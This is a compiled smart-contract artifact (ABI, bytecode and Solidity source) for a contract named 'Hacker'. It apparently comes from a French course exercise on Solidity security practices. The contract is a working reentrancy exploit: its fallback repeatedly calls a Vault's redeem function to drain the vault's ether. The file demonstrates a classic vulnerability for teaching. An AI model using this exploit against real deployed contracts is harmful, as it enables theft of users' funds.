{
  "contractName": "Hacker",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_vaultAddress",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "inputs": [],
      "name": "vault",
      "outputs": [
        {
          "internalType": "contract Vault",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b50604051610457380380610457833981810160405281019061003291906100db565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610108565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100a88261007d565b9050919050565b6100b88161009d565b81146100c357600080fd5b50565b6000815190506100d5816100af565b92915050565b6000602082840312156100f1576100f0610078565b5b60006100ff848285016100c6565b91505092915050565b610340806101176000396000f3fe60806040526004361061002d5760003560e01c80639e5faafc146100f7578063fbfa77cf146101015761002e565b5b670de0b6b3a764000060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631106100f55760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663be040fb06040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156100dc57600080fd5b505af11580156100f0573d6000803e3d6000fd5b505050505b005b6100ff61012c565b005b34801561010d57600080fd5b5061011661024c565b60405161012391906102ef565b60405180910390f35b670de0b6b3a764000034101561014157600080fd5b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663975057e7670de0b6b3a76400006040518263ffffffff1660e01b81526004016000604051808303818588803b1580156101b157600080fd5b505af11580156101c5573d6000803e3d6000fd5b505050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663be040fb06040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561023257600080fd5b505af1158015610246573d6000803e3d6000fd5b50505050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b60006102b56102b06102ab84610270565b610290565b610270565b9050919050565b60006102c78261029a565b9050919050565b60006102d9826102bc565b9050919050565b6102e9816102ce565b82525050565b600060208201905061030460008301846102e0565b9291505056fea26469706673582212203be4257e81eacdd537dcb55a23bff1d09723192d98c33dfffb800d6ef3090eb864736f6c63430008120033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: GPL-3.0\npragma solidity 0.8.18;\n\nimport './Vault.sol';\n \ncontract Hacker {\n    Vault public vault;\n \n    constructor(address _vaultAddress) {\n        vault = Vault(_vaultAddress);\n    }\n\n \n    function attack() external payable {\n        require(msg.value >= 1 ether);\n        vault.store{value: 1 ether}();   \n        vault.redeem();\n    }\n      \n    // Fallback is called when Vault sends Ether to this contract.\n    fallback() external payable {\n        if (address(vault).balance >= 1 ether) {\n            vault.redeem();\n        }\n    }\n}",
  "sourcePath": "/home/qmoreaux/Alyra/Git/5. Smart contract Solidity & bonnes pratiques de sécurité/contracts/Reentrancy/Hacker.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.18+commit.87f61d96.Emscripten.clang"
  },
  "schemaVersion": "3.4.11",
  "updatedAt": "2023-02-26T11:00:36.991Z",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}